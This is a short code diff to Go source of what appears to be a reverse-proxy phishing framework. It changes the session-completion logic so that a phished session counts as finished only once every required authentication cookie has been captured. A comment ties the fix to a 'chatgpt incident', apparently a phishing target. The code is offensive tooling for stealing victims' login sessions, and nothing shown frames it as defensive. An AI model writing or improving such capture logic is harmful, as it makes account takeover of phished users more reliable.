@@ -981,7 +981,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if ok && !s.IsDone {
 						for _, au := range pl.authUrls {
 							if au.MatchString(req.URL.Path) {
-								s.Finish(true)
+								// false-completion guard (chatgpt incident 23-09):
+								// an auth_url matching a PRE-LOGIN path (landing,
+								// marketing root) must not finish the session on its
+								// own — require the required auth tokens first,
+								// mirroring the response-side completion check.
+								if s.AllCookieAuthTokensCaptured(pl.cookieAuthTokens) {
+									s.Finish(true)
+								}
 								break
 							}
 						}
